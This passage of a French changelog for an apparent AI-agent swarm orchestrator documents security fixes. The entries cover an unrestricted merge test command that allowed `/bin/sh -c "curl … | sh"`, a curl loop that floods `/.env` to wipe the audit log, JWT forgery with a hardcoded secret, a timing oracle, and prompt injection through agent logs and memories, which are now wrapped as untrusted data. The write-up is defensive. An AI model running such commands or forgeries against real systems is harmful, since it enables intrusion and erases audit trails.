  apprendre d'utile au visiteur. La réponse est maintenant une **projection
  explicite**, construite champ par champ, avec l'URL du dépôt **lavée de ses
  identifiants** (et un chemin local jamais publié : il décrit l'arborescence
  de la machine de l'hôte). Le correctif qui compte n'est pas le filtre mais le
  **test associé** : il relit `types.ts` et échoue si un champ de `Project`
  n'est ni publié ni explicitement retenu **avec sa raison écrite**. Sans lui,
  la prochaine colonne ajoutée à la table serait publiée le jour de son ajout —
  c'est très exactement ainsi que cette fuite était née.

- **La commande de test d'un merge ne peut plus être n'importe quel binaire**
  (module pur `src/shared/commande-test.ts`). `POST /api/projects/:id/merge/run`
  acceptait un `testCommand: string[]` que le hub relayait au premier nœud en
  ligne, lequel exécutait `spawn(argv[0], argv.slice(1), { shell: false })`.
  **`shell: false` ne protégeait de rien ici** : ce qu'il empêche, c'est
  l'interprétation d'une _chaîne_ par un shell — or `argv[0]` **est** le
  binaire. `["/bin/sh", "-c", "curl … | sh"]` s'exécutait tel quel sur la
  machine d'un membre, avec ses droits et son `HOME`. Deux aggravations
  rendaient l'affaire sérieuse plutôt que théorique : **le jeton de ruche n'est
  pas un secret d'administrateur** (les anciennes invitations `hive1_` le
  portent en clair, sans expiration ni révocation individuelle — quiconque en a
  reçu une gardait donc l'exécution de code sur toutes les machines de l'essaim,
  pour toujours), et **ce chemin ne passe pas par le bac à sable**
  (`merge-runner.ts` n'appelle pas `envelopper()`, donc `HIVE_ISOLEMENT=exige`
  — le réglage qu'on pose précisément quand on prête sa machine à des inconnus
  — n'avait aucun effet). Le binaire est désormais restreint à une **liste de
  lanceurs de tests** (npm, pnpm, yarn, bun, node, deno, make, cargo, go,
  pytest, python, mvn, gradle, dotnet, composer, rake, bundle, phpunit, vitest,
  jest), suffixes Windows compris (`npm.cmd`), plus les **wrappers du dépôt**
  `./gradlew` et `./mvnw` reconnus à leur nom **exact** — la seule entorse à la
  règle « pas de chemin », et elle est close par comparaison littérale (un test
  vérifie que `./gradlew/../../bin/sh` reste refusé). Cela ne rend pas la
  commande inoffensive et ne le prétend pas : `npm test` exécute ce que le
  `package.json` du dépôt contient, et c'est exactement ce qu'on lui demande.
  **La frontière de confiance redevient le dépôt que l'hôte a choisi de
  connecter, au lieu de « n'importe quel exécutable de la machine du membre ».**
  La garde est posée **aux deux bouts** : le hub refuse en 400 avec un motif
  lisible, et le nœud refuse à son tour — c'est celle-là qui compte, un nœud ne
  devant pas tenir pour acquis que le hub est bien celui qu'il croit sur un
  transport que la ruche accepte encore en clair. Un test de source relit
  `merge-runner.ts` et échoue si le jugement cesse de précéder l'exécution, et
  un autre vérifie qu'aucun shell ni téléchargeur ne s'est glissé dans la liste
  — l'y ajouter rouvrirait la faille en une ligne sans qu'aucun autre test ne
  bronche.

- **Les Guetteuses n'écrivent plus au journal à chaque passage — le détecteur
  ne peut pas servir d'arme.** Régression introduite par la version initiale du
  module et corrigée avant publication : un événement `guet_leurre` était émis à
  **chaque** leurre touché. Or le journal est durable et **borné à 5 000
  entrées**, et cette route n'est couverte par **aucune limitation de débit**
  (le crochet ne voit que `/api/*`, et un leurre n'en fait par construction pas
  partie). `for i in $(seq 6000); do curl -s ruche/.env; done` **chassait donc
  tout l'historique d'audit** — nœuds rejoints, billets révoqués, rôles changés,
  plafonds posés. Le module écrit pour rendre le reniflage bruyant offrait le
  levier pour rendre tout le reste silencieux. On écrit désormais par
  **changement d'état** et non par passage : `Registre.doitAlerter()` ne rend un
  niveau que lorsqu'il **monte**, et la reprise après retour au calme est bornée
  à une par fenêtre — au pire **deux lignes par heure** au lieu de six mille.
  Deux pièges opposés ont été trouvés et fermés en écrivant les tests :
  l'escalade « reniflage → balayage » était étouffée par la fenêtre (soit
  exactement l'alerte qui compte), et le réarmement dépendait d'un verdict
  « calme » **qu'on n'observe jamais** — cette méthode n'étant appelée qu'au
  moment où un leurre vient d'être touché, une ruche sondée une fois serait
  devenue sourde pour toujours. Une nouvelle campagne se reconnaît maintenant à
  ceci que le passage est le seul de sa fenêtre. Le **compte exact reste
  disponible** sur `GET /api/guet` : on écrit moins, on ne voit pas moins.

- **🐝 Les Guetteuses — rendre une intrusion BRUYANTE** (module pur
  `src/orchestrator/guetteuses.ts`, route `GET /api/guet`, événement
  `guet_leurre`). **Elles ne ferment aucune porte de plus, et ne prétendent pas
  le faire** : il n'existe pas de sécurité inviolable, et un projet qui le
  prétendrait rendrait le pire service à ses utilisateurs — on baisse la garde
  devant ce qu'on croit imprenable. Ce qui manquait est ailleurs : quelqu'un
  pouvait passer une nuit à sonder une ruche exposée — chercher un `.env`, un
  `/phpmyadmin`, une sauvegarde oubliée — **sans que son propriétaire
  l'apprenne jamais**. Le renseignement précède l'intrusion ; le voir, c'est
  gagner le temps de révoquer un billet ou de couper une écoute publique avant
  que quoi que ce soit de coûteux n'arrive. Seize chemins-leurres qu'**aucun**
  client légitime ne demande (ni le dashboard, ni la CLI, ni un nœud), la
  normalisation des contournements usuels (`//.env`, `/./.env`, `%2E`, casse,
  antislash), et trois niveaux — calme, reniflage, balayage — chacun avec la
  marche à suivre. **L'invariant qui décide de tout est le zéro faux positif** :
  une alerte qui se trompe est une alerte qu'on apprend à ignorer, donc pire
  que rien puisqu'elle donne l'illusion d'une surveillance. Un test relit les
  routes réellement déclarées par `server.ts` et vérifie qu'**aucun leurre n'en
  croise une**. La réponse servie est **exactement** le 404 ordinaire : un
  leurre qui se signale cesse d'être un leurre. Le registre vit en mémoire et
  est **borné** — une table qui grossirait à chaque requête d'un scanner lui
  offrirait de quoi remplir le disque de sa victime. Et rien n'est **bloqué**
  automatiquement : derrière un reverse proxy, toutes les requêtes viennent de
  la même adresse, et un blocage y couperait tout le monde sur la foi d'un seul
  visiteur curieux.

- **Un billet refusé dit pourquoi — et l'oracle temporel qui traînait est
  fermé** (`docs/adr/0005`). « Billet refusé » sans raison était le cas d'échec
  le plus fréquent du chemin « rejoindre » et le plus vexant : quelqu'un colle
  son billet deux jours plus tard, se fait refuser, et n'a aucun moyen de
  savoir s'il faut en redemander un ou vérifier sa connexion. Le message
  uniforme se justifiait pourtant : distinguer « inconnu » d'« expiré »
  permettrait d'**énumérer les identifiants de billets existants**.
  **Sauf que l'oracle était déjà ouvert, et l'horloge le disait** : un
  identifiant inconnu était refusé par `jugerBillet` **sans que PBKDF2 tourne**,
  là où un identifiant connu au mauvais secret payait 100 000 itérations —
  **1,8 ms contre 18,1 ms, un facteur 9,8**, lisible avec n'importe quel client
  HTTP. L'ordre de vérification est donc inversé : le secret est contrôlé
  **d'abord et toujours au même coût**, contre `empreinteLeurre()` — une
  empreinte factice de dépense identique — quand le billet n'existe pas. Une
  fois le porteur authentifié, la ruche lui dit **`expire`, `epuise` ou
  `revoque`** avec la marche à suivre ; ces trois-là ne s'apprennent qu'avec le
  bon secret en main, donc les révéler n'apprend rien à qui ne l'avait pas.
  **`inconnu` et `secret_invalide` restent indistinguables à l'octet près** —
  c'est cette indistinction qui ferme la porte, et un test compare les deux
  réponses caractère par caractère. Le motif exact continue de partir au
  journal (`invite_rejected`), pour l'hôte. Au passage, `join.ts` affichait le
  `detail` du 409 « identifiant déjà utilisé »… en le jetant : il portait
  pourtant la seule marche à suivre utile.

- **Le secret de session était écrit en dur dans un dépôt public**
  (⚠️ **CHANGEMENT CASSANT** : la ruche refuse désormais de démarrer sans
  `HIVE_JWT_SECRET`, et les sessions ouvertes avec l'ancien secret sont
  invalidées — c'est le prix, et il est juste). `auth.ts` signait les jetons de
  session avec `process.env.HIVE_JWT_SECRET || 'change-me-jwt-dev-only'`, et ni
  `npm run install:hive` ni les README ne posaient cette variable : **toutes**
  les ruches installées signaient donc avec la même clé, lisible par quiconque
  ouvrait le fichier. `verifyJwt` ne vérifiant que la signature et l'expiration,
  et `roleDe` rendant « membre » pour un identifiant inconnu, un jeton forgé
  donnait (1) une **session complète sans compte**, contournant intégralement
  `HIVE_INSCRIPTION=fermee`, et (2) forgé sur l'identifiant de l'administrateur,
  **l'administration entière** — serveurs, rôles, tout. L'invariant « le jeton
  de ruche ne vaut pas preuve d'administration » était scrupuleusement tenu,
  mais le JWT n'en valait pas davantage. Il n'y a plus **aucune** valeur par
  défaut : `secretJwtDepuisEnv` refuse l'absence, le blanc, l'ancien secret
  publié (`SECRET_JWT_INTERDIT`, qui traîne désormais dans les `.env` recopiés)
  et tout secret de moins de `LONGUEUR_MIN_SECRET_JWT` = 24 caractères — le
  marque-place `change-me` de `.env.example` compris. La garde vit dans
  `createServer`, **avant toute écoute réseau**, sur le modèle exact de celle de
  `HIVE_TOKEN` : un serveur qui ne démarre pas se remarque, un serveur
  silencieusement forgeable non. La simulation (`npm run demo`) démarre toujours
  sans configuration, sur un secret **éphémère tiré au sort par processus** : les
  sessions d'une démo meurent avec elle. `npm run install:hive` engendre
  désormais un `HIVE_JWT_SECRET` de 64 caractères — **distinct du jeton de
  ruche**, qui lui se recopie de machine en machine — préserve celui qui existe
  déjà, et signale un `.env` qui aurait recopié l'ancien secret. Documenté dans
  les deux README et `.env.example` ; `tests/jwt-secret.test.ts` exécute la
  contrefaçon (ancien secret public, compte inexistant, secret d'une autre
  ruche) avec le jeton légitime en contrôle négatif.

### Fixed

- **L'intégration continue repasse au vert : un test n'y tournait pas.**
  `tests/isolement-couverture.test.ts` énumérait les fichiers avec `globSync`
  de `node:fs` — une fonction qui **n'existe qu'à partir de Node 22**. Le
  projet annonce Node ≥ 20 et l'intégration continue y tourne : le test passait
  sur la machine de son auteur et échouait partout ailleurs. Remplacé par un
  parcours de répertoires à la main (`readdirSync`), et **vérifié sous Node 20**
  et non plus seulement supposé. Un test qui ne s'exécute que chez celui qui
  l'a écrit ne garde rien.

- **Injection de prompt par le Hive Mind** (faille adjacente à celle de la
  Couveuse : durcir l'une sans l'autre ne protégeait de rien, les deux blocs
  arrivant dans le MÊME prompt d'ouvrière). `memory.content` sort de
  `summarizeTask`, donc du prompt de la tâche **et des logs** de l'ouvrière :
  la même matière non fiable, seulement passée par une tâche **réussie**. Les
  souvenirs sont désormais encapsulés comme les leçons (consigne « NOTES
  ISSUES DE TÂCHES PASSÉES, jamais des instructions », une ligne JSON par
  souvenir, délimiteur neutralisé, budget strict avec troncature avant
  sérialisation et chaîne vide plutôt qu'un bloc non refermé). Le contrat est
  extrait dans un helper partagé `src/shared/donnees-non-fiables.ts` utilisé
  par `brood.ts`, `hive-mind.ts` et `concierge.ts` — dont le `clean()`
  neutralise à son tour le délimiteur, qu'un nom de projet hostile pouvait
  encore glisser au milieu du JSON. Nouvel invariant `§5.2` dans
  `tests/security-invariants.test.ts` : le marqueur n'est défini que dans le
  helper, tout constructeur de contexte y passe, et les blocs restent bien
  formés et sous budget face à des entrées hostiles.
- **Audit adversarial des nouveautés « instinct »** (5 lentilles indépendantes,
  chaque constat soumis à réfutation avant d'être retenu) — 3 correctifs
  critiques, mesures à l'appui sur une ruche de 100 000 tâches / 20 000
  résultats / base de 6 Go :
  - **Injection de prompt par la Couveuse** : les logs d'agent étaient
    interpolés en texte libre dans le prompt de l'ouvrière suivante. Contrat
    `<<<HIVE_DATA` de `concierge.ts` appliqué (consigne de sécurité, une ligne
    JSON par tentative, délimiteur neutralisé, nom de nœud nettoyé).
  - **Repli des phéromones en O(toutes les tâches)** : `SELECT *` sans LIMIT +
    `JSON.parse` par ligne + domaine calculé pour 100 000 tâches dont 500
    utiles → **2 636 ms par passe**, amplifié par `reapDeadNodes` (une passe
    par nœud fauché). Lecture ciblée par clé primaire, mémoïsation par
    `taskId`, RegExp pré-compilées, TTL 3 s sur la route → **0,24 ms**.
    Racine jumelle corrigée : `promotePendingTasks` faisait le même `SELECT *`.
  - **Table `results` sans index de tri et jamais élaguée** : plan `SCAN` +
    `TEMP B-TREE` ouvrant les pages de débordement `diff`/`logs` alors que la
    requête ne projette que 4 petites colonnes → index **couvrant**
    `idx_results_recent`, **1 612 ms → 0,43 ms**. `pruneResults` allège
    (vide `diff`/`logs`) au-delà de 5 000 résultats sans jamais supprimer la
    ligne, dont la Miellerie et le Parlement ont encore besoin.
- Thermorégulation : les échecs en **cascade** ne chauffent plus la ruche
  (1 échec réel + 9 dépendantes : 77° → 25°), les refus **Night Shift** ne
  comptent plus comme des refus infra, et la fenêtre de 10 min est lue par
  **borne temporelle SQL** (index `events(ts, type)`) au lieu d'un lot de
  1000 événements qu'un flot de `task_progress` suffisait à saturer.
- Le message français n'est plus figé dans le payload persisté des nouveaux
  événements — seul cas sur 34 : le Journal reconstruit le texte bilingue,
  comme pour tous les autres.
- `startRace` respecte la ventilation ; la re-livraison de secours porte enfin
  le `hiveContext` (fonction de contexte partagée) ; l'hystérésis compte les
  ticks hors bande (deux bandes alternées ne basculaient jamais).
- 4 correctifs (revue du suivi de courses) : victoires plafonnées aux tâches
  visibles du journal (pas de bonus fantôme après élagage), badge ⚔ coupé par
  `prefers-reduced-motion` et éteint si le poll `/api/races` est en panne,
  `role="img"` sur le badge (aria-label prohibé sur un span générique).
- 8 correctifs (revue du câblage Drone Wars) : startRace respecte le Sting
  Detector, drones fantômes purgés à la réconciliation, capacité consciente
  des drones non-primaires (fini la sur-réservation), promotion en `assigned`
  (filet staleAssignedTasks réarmé, re-livraison à tous les drones),
  cancel_task centralisé dans le scheduler, télémétrie des drones visible,
  workspaces suffixés par nœud (plus de collision sur workRoot partagé).

- 21 correctifs issus de la revue adversariale multi-agents (AZERTY,
  raccourcis sous modales, IME, focus des alvéoles, contraste AA, anti-
  injection du prompt de la Reine, collisions d'ids Queen Bee, pollings
  résilients…), journal Chronique paginé (300 lignes rendues).
- 10 correctifs (2e passe) : le serveur est la source de vérité des revues
  (une tâche rejetée ne coule jamais, sélection comme repli), 409 sur la
  pré-approbation, store client convergent (fencing d'hydratation, POSTs
  sérialisés, re-hydratation à chaque reconnexion WS).
- 8 correctifs (3e passe) : `HIVE_SHIFT` malformée ne gèle plus une tâche,
  `task_reject.retryAfterMs` (cooldown proportionnel — plus de spam du
  journal la nuit), merge aussi refusé hors service, verdicts WS d'autres
  opérateurs différés puis rejoués, outbox `hive.review.unsynced` re-postée
  (bandeau « revues non synchronisées »).
- **⚖️ La Balance — audit adverse, 8 correctifs.**
  - **Le grand livre perdait des dépenses, définitivement.** `CacheProjets.resoudre`
    insérait les manquants puis RELISAIT le cache pour bâtir son retour ; la purge
    d'insertion pouvait emporter une clé que l'appel devait rendre, et le filigrane
    ayant avancé, la dépense n'était jamais relue. Reproduit : 21 006 ms comptés
    contre 5 021 006 ms réels, avec `aJour: true` — un projet à 50× son plafond que
    `jugerPlafond` laissait passer. Le cache borné est désormais un objet UNIQUE
    (`src/orchestrator/cache-borne.ts`, partagé avec `CacheDomaines` qui avait le
    même contrat et le même défaut) : le retour est bâti sur les hits relevés AVANT
    insertion et les lignes rendues par le chargeur, l'éviction est un VRAI LRU, et
    elle est en **O(1) amorti** (file explicite) au lieu de `keys().next()`, qui est
    O(taille) dans V8 — 6 540 ms → 368 ms sur un rattrapage de 400 000 tentatives.
  - **`listReviewsFor(ids)`** : le socle de la Balance ne déplie plus la table
    `reviews` (jamais élaguée) toutes les 3 s pour n'en garder que 2 000 clés —
    144 ms → 4,7 ms à 100 000 revues, sur un chemin qui bloquait la boucle
    d'événements et retardait le tick.
  - **Coercition AJV** : `plafondMs: false` devenait un plafond de 0 (projet arrêté
    net) et `""` un `null` (plafond retiré). La valeur BRUTE est refusée en
    `preValidation`, avant que le schéma ne valide une valeur déjà remplacée.
  - **Filet de re-livraison** : le contexte (BM25 sur la mémoire) n'est plus
    reconstruit par tâche muette ET par tick dans le corps synchrone du
    `setInterval` ; il n'est calculé que si une socket est ouverte, et mémoïsé par
    tâche.
  - **Rattrapage du grand livre au démarrage** : nouveau CACHE reconstructible
    `balance_ledger_cache` (filigrane + soldes), qui **amende explicitement la
    règle 1 de la doctrine** — motif et condition de validité écrits dans
    `balance.ts`. 200 000 résultats : 101 ticks de rattrapage (≈ 200 s de plafonds
    FAIL-OPEN à chaque démarrage) → 5 ticks. Jeté au moindre doute (version,
    filigranes divergents, filigrane au-delà du dernier `results.id`) ; la
    reconstruction totale est un `DELETE`.
  - **Mode `off`** : plus de `depenseMs: 0` fabriqué pour les projets plafonnés —
    un solde inconnu n'est pas un solde nul. `soldes: []`.
  - **Événements renommés** avant qu'une base de production n'existe :
    `balance_alerte` → `balance_alert`, `balance_seuil` → `balance_cap_reached`,
    `balance_plafond` → `balance_cap_set`. C'étaient les 3 seuls types en français
    sur 46.
  - Commentaire faux corrigé dans `pruneResults` (le seuil est le plus RÉCENT
    résultat à alléger, pas le plus ancien conservé intact).

## [0.2.0] — 2026-07-15

Grande intégration nocturne : les 12 PRs ouvertes (paliers 2 → 4 + innovations)
fusionnées et réconciliées avec la lignée auth/marketplace/OpenAlex, puis
refonte complète de l'interface en **Mission Control**.

### Added

- **🎛️ Mission Control** — le dashboard devient une application 8 vues
  (sidebar alvéolaire, navigation hash, touches 1-8, deep-links) : Ruche,
  Reine, Miellerie, Projets, Essaim, Santé, Chronique, Mémoire.
- **👑 La Reine répond** — dialogue multilingue avec la ruche
  (`POST /api/chat`, CLI `ask`, vue dédiée) : avancement réel, résumé du
  journal, classement, santé, aide au cadrage avec bonnes pratiques par type
  de projet. Détection de langue (fr/en natif, toute langue via IA), repli
  hors-ligne déterministe garanti — le modèle ne reçoit que les chiffres réels.
- **🍯 Miellerie** — centre de revue des productions IA : file triée
  (échecs d'abord), diff découpé par fichier avec stats +/−, logs, consensus
  du Parlement (barre de factions, quorum), approbation/rejet au clavier
  (j/k/a/x), footer merge Honeycomb avec suivi du résultat.
- **Paliers 2→4 fusionnés dans main** : Queen Bee (planner heuristique +
  Claude), Hive Mind (BM25, injection de contexte à l'assignation),
  Sting Detector, Honeycomb Merge (plan + exécution réelle sur nœud),
  token-failover, sous-agents, adaptateur commande libre, Time-Lapse Replay,
  Drone Wars (cœur pur), Waggle Board, Parlement des Agents, Ghost in the
  Hive, Night Shift, Hive Pulse, rapport par projet, garde des invariants
  de sécurité (§5).
- **🧬 OpenAlex** — moteur de recherche scientifique intégré, désormais dans
  la vue Mémoire.
- **🔐 Authentification** — register/login JWT (node:crypto pur) +
  marketplace de projets publics.
- **Adaptateur Hermes Agent** — `hermes agent run --prompt "<prompt>"`.

### Changed

- Queen Bee : deux backends complémentaires — `/api/plan` (heuristique +
  Claude via `ANTHROPIC_API_KEY`) et `/api/projects/:id/brief` (OpenRouter).
- Hive Mind : la variante BM25 câblée de bout en bout (protocole → nœud →
  dashboard) remplace la classe FTS5 ; le contexte est joint à l'assignation
  côté serveur, sans réécrire le prompt persisté.

### Tests

- Compilation TypeScript stricte (`tsc --noEmit` propre), ESLint + Prettier
  zéro erreur, 253 tests vitest verts.

## [0.1.0] — 2026-07-14

### Added

- Orchestrateur central (Fastify + WebSocket + SQLite) avec hub-and-spoke
- Client nœud avec reconnexion automatique et heartbeat
- Démo `npm run demo` : orchestrateur + 2 nœuds simulés + projet 7 tâches DAG
- Sandbox v0 : cwd dédié, environnement épuré, timeout, annulation
- Adaptateurs : shell (simulé), claude-code, codex
- Dashboard Swarm View : vue SVG 2D + vue 3D Galacean Engine
- CLI : state, project, brief, tasks, watch, cancel, invite
- Invitations : `npm run join -- <token>` avec auto-détection d'agent
- Persistance SQLite (survit aux crashs), journal d'événements
- Sécurité : token partagé, CORS restreint, validation entrées, anti-DoS,  
  zéro `shell: true`, défense anti path-traversal côté nœud
